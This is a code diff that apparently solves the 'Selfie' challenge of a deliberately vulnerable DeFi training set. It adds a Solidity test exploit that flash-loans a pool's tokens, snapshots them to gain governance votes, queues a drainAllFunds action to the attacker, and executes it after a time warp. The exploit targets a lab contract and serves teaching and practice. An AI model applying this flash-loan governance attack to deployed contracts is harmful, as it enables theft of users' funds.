@@ -45,7 +45,9 @@ contract Selfie is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
-
+	exploit_propose();
+	vm.warp(block.timestamp + 2 days);
+	exploit_execute();
         /** EXPLOIT END **/
         validation();
     }
@@ -54,5 +56,32 @@ contract Selfie is Test {
         // Attacker has taken all tokens from the pool
         assertEq(dvtSnapshot.balanceOf(attacker), TOKENS_IN_POOL);
         assertEq(dvtSnapshot.balanceOf(address(selfiePool)), 0);
+    }
+
+    uint action_id;
+    function exploit_execute() public {
+	    simpleGovernance.executeAction(action_id);
+    }
+
+    function exploit_propose() public {
+	    uint bal = selfiePool.token().balanceOf(address(selfiePool));
+	    selfiePool.flashLoan(bal);
+    }
+
+    function receiveTokens(address token, uint256 amount) external {
+	    dvtSnapshot.snapshot();
+
+	    bytes memory drainData = abi.encodeWithSignature(
+		    "drainAllFunds(address)",
+		    attacker
+	    );
+
+	    action_id = simpleGovernance.queueAction(
+		    address(selfiePool),
+		    drainData,
+		    0
+	    );
+
+	    dvtSnapshot.transfer(address(selfiePool), amount);
     }
 }
